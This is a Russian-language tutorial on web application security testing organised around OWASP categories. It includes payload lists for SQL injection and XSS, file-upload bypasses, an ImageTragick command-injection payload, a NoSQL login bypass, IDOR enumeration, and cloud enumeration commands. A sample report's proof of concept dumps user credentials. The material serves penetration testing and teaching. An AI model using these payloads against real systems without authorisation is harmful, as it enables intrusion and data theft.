# Web Application Security Testing

## Введение

Тестирование безопасности веб-приложений включает выявление уязвимостей и слабых мест в веб-системах с использованием ручных и автоматизированных методов.

## Методология тестирования

### OWASP Testing Guide v4.2

```markdown
## Основные категории тестирования

### 1. Information Gathering
- Сбор метаданных
- Анализ robots.txt
- Карта приложения
- Определение технологий

### 2. Configuration Management
- Тестирование инфраструктуры
- Конфигурационные файлы
- SSL/TLS тестирование
- Backup файлы

### 3. Identity Management
- Тестирование аутентификации
- Тестирование авторизации
- Управление сессиями
- Account enumeration

### 4. Input Validation
- SQL Injection
- Cross-Site Scripting (XSS)
- LDAP Injection
- XML Injection
- Command Injection

### 5. Error Handling
- Information disclosure
- Stack traces
- Error pages
```

## Практическое тестирование

### Инструменты

```bash
# Сканеры уязвимостей
# Nikto
nikto -h https://target.com

# OWASP ZAP
zap-cli quick-scan https://target.com

# Burp Suite
# Professional version required

# Nmap NSE scripts
nmap -p80,443 --script http-vuln* target.com
```

### SQL Injection

```sql
# Union-based
' UNION SELECT 1,2,3,4,5--

# Boolean-based
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables)='A'--

# Time-based
' AND IF(1=1,SLEEP(5),0)--

# Error-based
' AND 1=CONVERT(int,@@version)--
```

### XSS (Cross-Site Scripting)

```javascript
// Reflected
<script>alert(document.domain)</script>

// Stored
<img src=x onerror=alert(1)>

// DOM-based
javascript:alert(document.domain)

// Filter bypass
"><script>alert(1)</script>
<svg/onload=alert(1)>
javascript:/*--></svg><img src=x onerror=alert(1)>*/
```

### CSRF (Cross-Site Request Forgery)

```html
<!-- Проверка уязвимости к CSRF -->
<!-- Если токен можно предсказать или отсутствует - уязвим -->

<!-- Bypass техники -->
1. Удаление токена из параметров
2. Использование других HTTP методов
3. Referer bypass
4. Token placement в URL
```

### File Upload Vulnerabilities

```bash
# Тестирование загрузки файлов

# Обход расширений
shell.php -> shell.php5
shell.php -> shell.phtml
shell.php -> shell.php%00.jpg

# Обход Content-Type
Content-Type: image/jpeg

# ImageTragick (ImageMagick)
push graphic-context
viewbox 0 0 640 480
image Over 0,0 640,480 'url(https://example.com/magic.jpg"|ls -la")'
pop graphic-context

# Upload to webroot
shell.php -> /images/shell.php
```

### IDOR (Insecure Direct Object References)

```bash
# Изменение параметров
/users/1001 -> /users/1002
/profile?user=john -> profile?user=admin

# Скрипт для перебора
for i in {1..1000}; do
    curl -u user:pass "https://app.com/api/orders/$i"
done
```

### Business Logic Testing

```markdown
## Тестирование бизнес-логики

### Authentication Bypass
- Повторное использование OTP
- Манипуляция двухфакторной аутентификацией
- Обход блокировки аккаунта

### Payment Testing
- Изменение суммы платежа
- Манипуляция валютой
- Negative testing (отрицательные значения)
- Coupon enumeration

### Race Conditions
- Coupon multiple use
- Transfer race condition
- Time-of-check to time-of-use (TOCTOU)
```

## API Security Testing

```bash
# REST API
# Authentication testing
POST /api/login
{"username": "admin", "password": {"$gt": ""}}

# Authorization testing
GET /api/users/1
GET /api/users/2

# Mass assignment
POST /api/update_user
{"name": "hacked", "is_admin": true}

# GraphQL
# Introspection query
query IntrospectionQuery {
    __schema {
        mutationType { name }
        queryType { name }
    }
}

# Batching attack
[{"query": "mutation { login...}"}, ...]
```

## Cloud Security Testing

```bash
# AWS
# IAM enumeration
aws iam list-users
aws iam list-policies --scope AWS

# S3 bucket testing
aws s3 ls s3://bucket-name/
aws s3 cp s3://bucket-name/secret.txt -

# Azure
# Azure CLI enumeration
az account list
az ad user list

# Enumerate Storage
az storage account list --query [].name
```

## Report Template

```markdown
# Vulnerability Report

## Executive Summary
| Parameter | Value |
|-----------|-------|
| Severity | Critical |
| CVSS | 9.8 |
| Status | Verified |
| Retest Required | Yes |

## Vulnerability Details
**Title:** SQL Injection in User Search
**Location:** /api/users/search?q=
**Category:** Injection

## Description
Приложение уязвимо к SQL инъекциям в параметре search. 
Злоумышленник может выполнять произвольные SQL запросы.

## Proof of Concept
```bash
curl "https://app.com/api/users/search?q=admin'%20UNION%20SELECT%201,username,password,4,5%20FROM%20users--"
```

## Impact
- Кража данных пользователей
- Компрометация базы данных
- Потенциальный доступ к системе

## Remediation
Используйте параметризованные запросы:
```python
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
```
```

## Automation

```python
# Custom vulnerability scanner
import requests
from bs4 import BeautifulSoup

class WebVulnScanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
    
    def check_xss(self, url):
        payloads = [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>'
        ]
        for payload in payloads:
            r = self.session.get(url, params={'q': payload})
            if payload in r.text:
                return True
        return False
    
    def check_sqli(self, url):
        payloads = ["'", "1 OR 1=1", "1' --"]
        for payload in payloads:
            r = self.session.get(url, params={'id': payload})
            if "error" in r.text.lower() or "syntax" in r.text.lower():
                return True
        return False
```

